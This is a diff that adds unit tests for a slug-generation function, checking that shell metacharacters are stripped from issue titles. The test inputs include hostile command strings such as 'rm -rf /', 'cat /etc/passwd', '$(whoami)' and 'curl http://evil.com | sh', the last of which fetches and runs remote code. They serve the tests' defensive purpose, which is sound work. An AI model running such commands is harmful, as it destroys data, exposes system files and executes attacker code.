@@ -150,3 +150,74 @@ describe("createSlugWithFallback", () => {
     expect(createSlugWithFallback("한글만", "custom")).toBe("custom");
   });
 });
+
+describe("createSlug - shell metacharacter sanitization", () => {
+  it("should strip semicolon command chaining", () => {
+    const result = createSlug("fix bug; rm -rf /");
+    expect(result).not.toContain(";");
+    expect(result).toBe("fix-bug-rm-rf");
+  });
+
+  it("should strip pipe characters", () => {
+    const result = createSlug("feature | cat /etc/passwd");
+    expect(result).not.toContain("|");
+    expect(result).toBe("feature-cat-etc-passwd");
+  });
+
+  it("should strip ampersand command chaining", () => {
+    const result = createSlug("update && malicious-command");
+    expect(result).not.toContain("&");
+    expect(result).toBe("update-malicious-command");
+  });
+
+  it("should strip dollar-sign variable/command substitution", () => {
+    const result = createSlug("$(whoami)");
+    expect(result).not.toContain("$");
+    expect(result).not.toContain("(");
+    expect(result).not.toContain(")");
+    expect(result).toBe("whoami");
+  });
+
+  it("should strip backtick command substitution", () => {
+    const result = createSlug("`id`");
+    expect(result).not.toContain("`");
+    expect(result).toBe("id");
+  });
+
+  it("should strip redirection operators", () => {
+    const withOutput = createSlug("title > /tmp/pwned");
+    expect(withOutput).not.toContain(">");
+
+    const withInput = createSlug("title < /etc/passwd");
+    expect(withInput).not.toContain("<");
+  });
+
+  it("should strip newlines that could break shell commands", () => {
+    const result = createSlug("fix\necho injected");
+    expect(result).not.toContain("\n");
+    expect(result).toBe("fix-echo-injected");
+  });
+
+  it("should handle complex injection attempt in issue title", () => {
+    const result = createSlug("Add feature; curl http://evil.com | sh");
+    expect(result).not.toContain(";");
+    expect(result).not.toContain("|");
+    expect(result).toBe("add-feature-curl-http-evil-com-sh");
+  });
+
+  it("should produce path-safe output for all shell metacharacters", () => {
+    const attacks = [
+      "$(id)",
+      "`whoami`",
+      "title; evil",
+      "title && evil",
+      "title || evil",
+      "title | evil",
+      "title > /tmp/x",
+    ];
+    for (const attack of attacks) {
+      const slug = createSlug(attack);
+      expect(isPathSafe(slug) || slug === "").toBe(true);
+    }
+  });
+});
